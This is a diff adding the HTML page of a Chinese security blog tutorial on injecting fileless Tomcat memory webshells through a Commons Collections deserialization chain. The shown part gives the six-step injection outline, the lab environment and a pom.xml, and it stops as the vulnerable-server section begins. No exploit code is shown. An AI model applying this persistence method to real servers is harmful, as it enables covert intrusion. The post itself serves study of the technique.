@@ -1,0 +1,1277 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地 - blog</title>
+
+  
+    <meta name="description" content="原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地 摘要：本文记录了一次完整的实践过程：在一个存在反序列化漏洞的 Tomcat Web 应用上，利用 Commons Collections 利用链，将 Filter &#x2F; Servlet &#x2F; Listener 类型的内存马注入进运行时内存，实现无文件落地的持久化控制。整体思路是：找到反序列化入口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地">
+<meta property="og:url" content="https://wr0ld.github.io/posts/b8e2f4a1/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地 摘要：本文记录了一次完整的实践过程：在一个存在反序列化漏洞的 Tomcat Web 应用上，利用 Commons Collections 利用链，将 Filter &#x2F; Servlet &#x2F; Listener 类型的内存马注入进运行时内存，实现无文件落地的持久化控制。整体思路是：找到反序列化入口">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-12T12:30:00.000Z">
+<meta property="article:modified_time" content="2026-04-21T13:21:33.302Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="Tomcat">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,反序列化,CC链,Tomcat,内存马">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-12T20:30:00+08:00","dateModified":"2026-04-21T21:21:33+08:00","datePublished":"2026-04-12T20:30:00+08:00","description":"","headline":"原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/b8e2f4a1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/b8e2f4a1/","keywords":"代码审计, Java, 反序列化, CC链, Tomcat, 内存马","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/ogIyfADuwNCAhF9ToazaYACAgED4C3oIAAeDE7~tplv-dy-aweme-images-ds-rs-v1_1918_1034_q80.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-12T12:30:00.000Z">2026-04-12</time></span><span class="sep"></span><span class="text word-count">字数：29028</span><span class="sep"></span><span class="text img-count">图片：15</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="原理分析-反序列化内存马-——-CC2-Tomcat三种组件-无文件落地"><a href="#原理分析-反序列化内存马-——-CC2-Tomcat三种组件-无文件落地" class="headerlink" title="原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地"></a>原理分析 | 反序列化内存马 —— CC2 + Tomcat三种组件 + 无文件落地</h1><blockquote>
+<p><strong>摘要</strong>：本文记录了一次完整的实践过程：在一个存在反序列化漏洞的 Tomcat Web 应用上，利用 Commons Collections 利用链，将 Filter &#x2F; Servlet &#x2F; Listener 类型的内存马注入进运行时内存，实现无文件落地的持久化控制。整体思路是：找到反序列化入口 → 构造利用链 → 动态获取 StandardContext → 注册恶意组件。适合已了解 Java 反序列化基础和内存马基本原理的同学作为进阶实战参考。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a></li>
+<li><a href="#%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%85%B3%E7%B3%BB">无文件攻击与内存马的关系</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E8%B7%AF">注入的核心思路</a></li>
+<li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">环境准备</a></li>
+<li><a href="#%E6%90%AD%E5%BB%BA%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF">搭建存在漏洞的服务端</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E6%8B%86%E8%A7%A3">注入流程拆解</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E9%80%89%E6%8B%A9%E9%80%BB%E8%BE%91">利用链的选择逻辑</a></li>
+<li><a href="#%E6%95%B4%E4%BD%93%E6%89%A7%E8%A1%8C%E9%93%BE%E8%B7%AF">整体执行链路</a></li>
+<li><a href="#step1%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8F%E7%BB%84%E4%BB%B6">Step1：编写恶意组件</a></li>
+<li><a href="#step2%E5%B0%81%E8%A3%85%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91">Step2：封装注入逻辑</a></li>
+<li><a href="#step3%E8%8E%B7%E5%8F%96%E7%BB%84%E4%BB%B6%E5%AD%97%E8%8A%82%E7%A0%81">Step3：获取组件字节码</a></li>
+<li><a href="#step4%E5%A5%97%E5%85%A5%E5%88%A9%E7%94%A8%E9%93%BE%E7%94%9F%E6%88%90-payload">Step4：套入利用链生成 Payload</a></li>
+<li><a href="#step5%E5%8F%91%E9%80%81%E5%88%B0%E7%9B%AE%E6%A0%87%E8%A7%A6%E5%8F%91%E6%B3%A8%E5%85%A5">Step5：发送到目标触发注入</a></li>
+<li><a href="#%E5%85%B3%E4%BA%8E%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB%E7%9A%84%E6%9B%BF%E4%BB%A3%E5%86%99%E6%B3%95">关于匿名内部类的替代写法</a></li>
+</ul>
+</li>
+<li><a href="#filter-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0">Filter 内存马注入实现</a></li>
+<li><a href="#servlet-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0">Servlet 内存马注入实现</a></li>
+<li><a href="#listener-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0">Listener 内存马注入实现</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%B8%A9%E5%9D%91">常见问题踩坑</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<hr>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在读这篇之前，建议先了解：</p>
+<ul>
+<li>Java 反序列化基础（序列化 &#x2F; 反序列化流程）</li>
+<li>反射机制（<code>getDeclaredField</code> &#x2F; <code>getDeclaredMethod</code> &#x2F; <code>invoke</code> 等）</li>
+<li>CC 利用链原理（本文以 CC2 为例）</li>
+<li>Tomcat 内存马三件套：Filter &#x2F; Servlet &#x2F; Listener 的注入原理</li>
+<li>Javassist 操作字节码的基本用法</li>
+<li>Tomcat 上下文机制（StandardContext 是什么，怎么用）</li>
+</ul>
+<p>如果对上面某些点不熟悉，建议先补一下再来，不然后面的代码看起来会比较吃力。</p>
+<hr>
+<h2 id="无文件攻击与内存马的关系"><a href="#无文件攻击与内存马的关系" class="headerlink" title="无文件攻击与内存马的关系"></a>无文件攻击与内存马的关系</h2><p>“无文件攻击”这个词经常被提到，但很多时候容易被误解成”什么文件都不需要”。实际上更准确的理解是：<strong>恶意代码的执行不依赖磁盘上的持久化文件</strong>。</p>
+<p>内存马之所以符合这个特征，是因为它的整个生命周期都绑定在 Web 容器的运行时内存里：</p>
+<ul>
+<li>容器在，马就在；容器重启，马就消失</li>
+<li>没有 WebShell 文件落地，传统的文件扫描发现不了</li>
+<li>挂载在请求处理链路上，每个请求都会经过，隐蔽性极强</li>
+</ul>
+<p>反序列化漏洞是植入内存马的理想入口，原因在于：反序列化操作本身就是”将数据变成代码执行”的过程，攻击者可以借助利用链，在目标 JVM 内部执行任意代码，而这一切对外部看起来只是一个正常的数据传输请求。</p>
+<hr>
+<h2 id="注入的核心思路"><a href="#注入的核心思路" class="headerlink" title="注入的核心思路"></a>注入的核心思路</h2><p>整个流程可以用下面几步来概括：</p>
+<ol>
+<li><strong>找到反序列化入口</strong>：接受序列化数据的 HTTP 接口（参数、文件上传等）</li>
+<li><strong>选择合适的利用链</strong>：目标类路径里有哪些可用的第三方库（CC2、CC4、CB1 等）</li>
+<li><strong>构造恶意类</strong>：这个类的构造函数里就是注入内存马的逻辑</li>
+<li><strong>获取 StandardContext</strong>：通过当前线程的类加载器反射获取</li>
+<li><strong>动态注册恶意组件</strong>：把 Filter &#x2F; Servlet &#x2F; Listener 塞进 Tomcat 的运行时</li>
+<li><strong>生成 Payload 发送</strong>：把恶意类字节码塞进利用链，序列化后发送给目标</li>
+</ol>
+<p>这其中最关键的一步其实是第 4 步——代码运行在反序列化触发的上下文里，没有任何正常的上下文获取渠道，怎么拿到 <code>StandardContext</code> 是个绕不开的问题。</p>
+<hr>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>本文实验环境如下：</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JDK</td>
+<td>8u65</td>
+</tr>
+<tr>
+<td>Tomcat</td>
+<td>9.0.x</td>
+</tr>
+<tr>
+<td>Commons Collections</td>
+<td>4.0</td>
+</tr>
+<tr>
+<td>Javassist</td>
+<td>3.20.0-GA</td>
+</tr>
+</tbody></table>
+<p><code>pom.xml</code> 核心依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.demo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.20.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.97<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>shell<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="搭建存在漏洞的服务端"><a href="#搭建存在漏洞的服务端" class="headerlink" title="搭建存在漏洞的服务端"></a>搭建存在漏洞的服务端</h2><p>为了模拟真实场景，先搭一个存在反序列化漏洞的 Servlet。这里提供两种入口：</p>
+<h3 id="1-文件上传型漏洞"><a href="#1-文件上传型漏洞" class="headerlink" title="1. 文件上传型漏洞"></a>1. 文件上传型漏洞</h3><p>直接对上传文件内容做反序列化：</p>
